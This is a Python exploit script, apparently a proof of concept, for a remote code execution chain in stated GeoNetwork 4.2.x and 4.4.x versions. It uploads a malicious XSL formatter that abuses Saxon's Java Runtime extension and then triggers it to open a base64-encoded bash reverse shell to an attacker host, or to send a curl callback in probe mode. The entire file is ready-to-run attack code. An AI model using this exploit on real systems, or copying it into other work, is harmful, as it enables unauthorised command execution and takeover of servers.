#!/usr/bin/env python3
"""(GeoNetwork 4.4.x-4.4.11 | 4.2.x to 4.2.16) formatter upload + Saxon extension RCE chain."""

import argparse
import base64
import io
import sys
import uuid
import warnings
import zipfile

import requests
from urllib3.exceptions import InsecureRequestWarning


def build_zip(lhost: str, port: int, probe: bool) -> bytes:
    if probe:
        # A raw nc listener will display this HTTP request if routing/firewall permit it.
        command = f"curl --max-time 4 http://{lhost}:{port}/proof"
        xpath_expr = f"rt:exec(rt:getRuntime(), '{command}')"
    else:
        shell = f"bash -i >& /dev/tcp/{lhost}/{port} 0>&1"
        encoded = base64.b64encode(shell.encode()).decode()
        # Runtime.exec(String) splits on literal spaces. This leaves the full
        # brace-expansion pipeline as the one command argument passed to bash -c.
        command = "bash -c {echo," + encoded + "}|{base64,-d}|{bash,-i}"
        xpath_expr = f"rt:exec(rt:getRuntime(), '{command}')"

    xsl = f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="java:java.lang.Runtime"
    exclude-result-prefixes="rt">
  <xsl:template match="/">
    <html><body><xsl:value-of select="{xpath_expr}"/></body></html>
  </xsl:template>
</xsl:stylesheet>
'''
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("view.xsl", xsl)
    return archive.getvalue()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Upload and render a GeoNetwork formatter for command execution."
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-L", "--lhost", required=True)
    parser.add_argument("-p", "-l", "--port", dest="port", required=True, type=int)
    parser.add_argument("-k", "--insecure", action="store_true")
    parser.add_argument(
        "--probe", action="store_true",
        help="Send an HTTP callback to the listener instead of opening a shell",
    )
    args = parser.parse_args()
    if not 1 <= args.port <= 65535:
        parser.error("port must be between 1 and 65535")

    lhost = args.lhost

    if args.insecure:
        warnings.simplefilter("ignore", InsecureRequestWarning)
    base = args.url.rstrip("/")
    session = requests.Session()
    session.verify = not args.insecure
    session.headers["User-Agent"] = "GeoNetwork-formatter-chain/1.1"
    try:
        info = session.get(f"{base}/srv/api/info", timeout=15)
        info.raise_for_status()
        csrf = session.cookies.get("XSRF-TOKEN")
        if not csrf:
            raise RuntimeError("GeoNetwork did not set an XSRF-TOKEN cookie")

        search = session.post(
            f"{base}/srv/api/search/records/_search",
            params={"bucket": "metadata"},
            headers={"Accept": "application/json", "Content-Type": "application/json"},
            json={"query": {"match_all": {}}, "size": 10, "_source": ["uuid"]},
            timeout=20,
        )
        search.raise_for_status()
        hits = search.json().get("hits", {}).get("hits", [])
        record_uuid = next(
            (hit.get("_source", {}).get("uuid") for hit in hits
             if hit.get("_source", {}).get("uuid")),
            None,
        )
        if not record_uuid:
            raise RuntimeError("The public-record search returned no UUID")

        formatter = "poc" + uuid.uuid4().hex[:10]
        archive_name = formatter + ".zip"
        upload = session.post(
            f"{base}/srv/api/formatters",
            headers={"Accept": "application/json", "X-XSRF-TOKEN": csrf},
            files={"file": (archive_name, build_zip(lhost, args.port, args.probe), "application/zip")},
            timeout=30,
        )
        if upload.status_code != 201:
            raise RuntimeError(f"Upload HTTP {upload.status_code}: {upload.text[:1000]}")

        print(f"[+] Upload accepted: HTTP {upload.status_code}; formatter={formatter}")
        print(f"[+] Public record: {record_uuid}")
        print(f"[+] Callback target: {lhost}:{args.port}")
        if args.probe:
            print("[+] Probe mode: the listener should display GET /proof")
        else:
            print("[+] Bash reverse shell; make sure nc is listening before the trigger")

        trigger = session.get(
            f"{base}/srv/api/records/{record_uuid}/formatters/{formatter}",
            headers={"Accept": "text/html"}, timeout=20,
        )
        if trigger.status_code != 200:
            raise RuntimeError(f"Trigger failed with HTTP {trigger.status_code}: {trigger.text[:1000]}")
        print(f"[+] Trigger returned HTTP 200: {trigger.text[:500].replace(chr(10), ' ')}")
        return 0
    except requests.RequestException as exc:
        print(f"[-] HTTP request failed: {exc}", file=sys.stderr)
        return 1
    except (ValueError, RuntimeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1
    finally:
        session.close()


if __name__ == "__main__":
    raise SystemExit(main())
